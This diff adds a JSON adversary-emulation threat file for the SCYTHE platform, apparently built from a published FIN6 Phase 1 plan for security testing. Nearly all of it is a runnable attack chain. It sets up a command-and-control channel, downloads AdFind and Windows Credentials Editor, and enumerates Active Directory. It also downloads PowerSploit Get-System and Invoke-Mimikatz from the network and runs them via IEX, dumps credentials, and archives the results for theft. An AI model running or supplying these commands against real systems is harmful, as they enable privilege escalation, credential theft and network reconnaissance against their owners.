@@ -1,0 +1,178 @@
+{
+    "threat": {
+        "category": "User-Defined",
+        "description": "A SCYTHE Threat based off of the Center for Threat Informed Defense FIN6 Emulation YAML, and specifically, the Phase 1 behaviors. https://github.com/center-for-threat-informed-defense/adversary_emulation_library/tree/master/fin6",
+        "display_name": "FIN6 Phase1",
+        "name": "FIN6_Phase1",
+        "operating_system_name": "windows",
+        "script": {
+            "0": {
+                "conf": {
+                    "--cp": "10.0.2.22:443",
+                    "--multipart": 10240,
+                    "--secure": true
+                },
+                "module": "https",
+                "type": "initialization"
+            },
+            "1": {
+                "module": "loader",
+                "module_to_load": "run",
+                "request": "--load run",
+                "type": "message"
+            },
+            "2": {
+                "module": "loader",
+                "module_to_load": "upsh",
+                "request": "--load upsh",
+                "type": "message"
+            },
+            "3": {
+                "module": "loader",
+                "module_to_load": "downloader",
+                "request": "--load downloader",
+                "type": "message"
+            },
+            "4": {
+                "depends_on": "6f076e51-2e23-46c2-b88e-4505902f960e",
+                "module": "downloader",
+                "request": "--src \"https://www.joeware.net/downloads/files/AdFind.zip\" --dest \".\\AdFind.zip\"",
+                "rtags": [
+                    "att&ck-technique:T1105"
+                ],
+                "type": "message"
+            },
+            "5": {
+                "depends_on": "6f076e51-2e23-46c2-b88e-4505902f960e",
+                "module": "downloader",
+                "request": "--src \"https://www.ampliasecurity.com/research/wce_v1_41beta_universal.zip\" --dest \".\\wce_v1_41beta_universal.zip\"",
+                "rtags": [
+                    "att&ck-technique:T1105"
+                ],
+                "type": "message"
+            },
+            "6": {
+                "depends_on": "6f076e51-2e23-46c2-b88e-4505902f960e",
+                "module": "downloader",
+                "request": "--src \"https://7-zip.org/a/7z1900-x64.exe\" --dest \".\\7.exe\"",
+                "rtags": [
+                    "att&ck-technique:T1105"
+                ],
+                "type": "message"
+            },
+            "7": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c powershell -Command Expand-Archive  \".\\AdFind.zip\" -DestinationPath .",
+                "rtags": [
+                    "att&ck-technique:T1140"
+                ],
+                "type": "message"
+            },
+            "8": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c powershell -Command Expand-Archive  \".\\wce_v1_41beta_universal.zip\" -DestinationPath .",
+                "rtags": [
+                    "att&ck-technique:T1140"
+                ],
+                "type": "message"
+            },
+            "9": {
+                "time": 10,
+                "type": "delay"
+            },
+            "10": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c adfind.exe -f (objectcategory=person) > ad_users.txt",
+                "rtags": [
+                    "T1087.002"
+                ],
+                "type": "message"
+            },
+            "11": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c adfind.exe -f (objectcategory=computer) > ad_computers.txt",
+                "rtags": [
+                    "T1018"
+                ],
+                "type": "message"
+            },
+            "12": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c adfind.exe -f (objectcategory=organizationalUnit) > ad_ous.txt",
+                "rtags": [
+                    "T1482"
+                ],
+                "type": "message"
+            },
+            "13": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c adfind.exe -gcb -sc trustdmp > ad_trustdmp.txt",
+                "rtags": [
+                    "T1482"
+                ],
+                "type": "message"
+            },
+            "14": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c adfind.exe -gcb -sc trustdmp > ad_subnets.txt",
+                "rtags": [
+                    "T1016"
+                ],
+                "type": "message"
+            },
+            "15": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c adfind.exe -f (objectcategory=group) > ad_group.txt",
+                "rtags": [
+                    "T1069.002"
+                ],
+                "type": "message"
+            },
+            "16": {
+                "depends_on": "ed8a7322-630d-4cc1-b065-8c2361d9f45d",
+                "module": "run",
+                "request": "cmd /c powershell.exe -exec bypass -C \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/Get-System.ps1'); Get-System -ServiceName 'mstdc' -PipeName 'mstdc'\"",
+                "rtags": [
+                    "T1134"
+                ],
+                "type": "message"
+            },
+            "17": {
+                "depends_on": "ed8a7322-630d-4cc1-b065-8c2361d9f45d",
+                "module": "run",
+                "request": "cmd /c powershell.exe -exec bypass -C \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds\"",
+                "rtags": [
+                    "T1003.001"
+                ],
+                "type": "message"
+            },
+            "18": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c wce.exe -w -o wce_creds.txt",
+                "rtags": [
+                    "T1003.001"
+                ],
+                "type": "message"
+            },
+            "19": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c 7.exe a -mx3 ad.7z ad_*",
+                "rtags": [
+                    "T1560.001"
+                ],
+                "type": "message"
+            }
+        },
+        "signature": "3ce1cbeedb097e1a0c3b83ebdd6c955a7433cf29"
+    }
+}
